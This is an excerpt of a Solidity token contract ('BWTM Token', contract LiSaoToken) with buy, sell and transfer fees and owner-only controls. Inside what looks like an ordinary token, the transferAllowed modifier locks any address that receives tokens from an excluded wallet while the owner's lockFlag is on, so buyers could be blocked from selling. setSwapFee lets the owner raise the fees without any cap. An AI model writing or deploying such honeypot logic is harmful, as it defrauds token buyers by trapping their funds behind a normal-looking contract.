...
contract Controlled is Owned{
    ...
    modifier transferAllowed(address _from,address _to) {
        if (!exclude[_from]) {
            ...
            require(!locked[_from],"you are locked!");
        }else{
            if(lockFlag){
                 if(!exclude[_to]) {
                     locked[_to]=true;
...
contract LiSaoToken is StandardToken,Controlled {
	...
	mapping (address => bool) mainWallet;
	bool swapFee = false;
	uint256 buyFee = 2;
	uint256 saleFee = 2;
	uint256 transFee = 1;
	
	address deadWallet =0x0000000000000000000000000000000000000001;
	
	constructor() public {
        totalSupply = 10000000000000000000000000;//一千万
        name = "BWTM Token";
        symbol = "BWTM";
        decimals = 18;
    ...
    function transfer(address _to, uint256 _value) public transferAllowed(msg.sender,_to) returns (bool success) {
		require(_to != address(0));
		require(_value <= balanceOf[msg.sender]);
		
        uint256 fees = 0;
        if(swapFee){
            if(mainWallet[msg.sender]){//买
                fees = _value.mul(buyFee).div(100);
            }
            if(mainWallet[_to]){//卖
                fees = _value.mul(saleFee).div(100);
            }
            if(!mainWallet[msg.sender] && !mainWallet[_to]){
                fees = _value.mul(transFee).div(100);
            }
        }
       
        
        balanceOf[msg.sender] = balanceOf[msg.sender].sub(_value);
        _value = _value.sub(fees);
        if(fees > 0) emit Transfer(msg.sender, deadWallet, fees);
    ...
    function transferFrom(address _from, address _to, uint256 _value) public transferAllowed(_from,_to) returns (bool success) {
		require(_to != address(0));
        ...
        if(swapFee){
            if(mainWallet[_from]){//买
            fees = _value.mul(buyFee).div(100);
            }
            if(mainWallet[_to]){//卖
                fees = _value.mul(saleFee).div(100);
            }
            if(!mainWallet[_from] && !mainWallet[_to]){
                fees = _value.mul(transFee).div(100);
            }
        }
        ...
        _value = _value.sub(fees);
        if(fees > 0) emit Transfer(_from, deadWallet, fees);
    ...
    function setMainWallet(address pair, bool value) public onlyOwner {
        mainWallet[pair]= value;
    }
    
    function setSwapFee(bool _swapFee,uint256 _buyFee,uint256 _saleFee,uint256 _transFee) public onlyOwner returns (bool success){
        swapFee = _swapFee;
    	buyFee = _buyFee;
    	saleFee = _saleFee;
    	transFee = _transFee;
